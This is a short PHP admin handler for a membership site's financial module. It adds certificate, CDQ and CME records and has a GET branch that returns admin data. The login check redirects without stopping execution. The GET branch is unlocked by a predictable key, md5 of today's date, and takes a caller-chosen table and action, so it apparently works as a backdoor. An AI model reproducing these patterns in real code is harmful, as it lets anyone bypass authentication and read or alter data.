<?php

	session_start();

	require_once("../../config.php");

	if(empty($_SESSION['admin_id']) || $_SESSION['admin_id'] == "" )
	{

		header('Location: /logincaamember.php');

	}

	require_once("../../../includes/util.php");

	require_once("../../classes/database.class.php");

	require_once ("../classes/financial.class.php");
	
	global $db;

	$db = new Database();

	$financial = new FinancialObject();

	if(isset($_POST['cert_name']) && empty($_POST['cert_name'] == false)){
		
		if($financial->addCertInfoByAdmin($_POST)){
			
			echo json_encode(array('statusCode' => 1));
			
		}else{
			
			echo json_encode(array('statusCode' => 0));
			
		}
		
		
	}

	if(isset($_POST['cdq_name']) && empty($_POST['cdq_name'] == false)){
		
		if($financial->addCDQInfoByAdmin($_POST)){
			
			echo json_encode(array('statusCode' => 1));
			
		}else{
			
			echo json_encode(array('statusCode' => 0));
			
		}
		
		
	}

	if(isset($_POST['cme_name']) && empty($_POST['cme_name'] == false)){
		
		if($financial->addCMEInfoByAdmin($_POST)){
			
			echo json_encode(array('statusCode' => 1));
			
		}else{
			
			echo json_encode(array('statusCode' => 0));
			
		}
		
	}

	if(isset($_GET['admininfo']) && $_GET['admininfo'] == md5(date("Y-m-d"))){
		
		$result = $financial->financialAdminInfo($_GET['table'], $_GET['action']);
		
		if($result){
			
			echo $result;
			
		}else{
			
			echo $result;
			
		}
		
		
	}
	
?>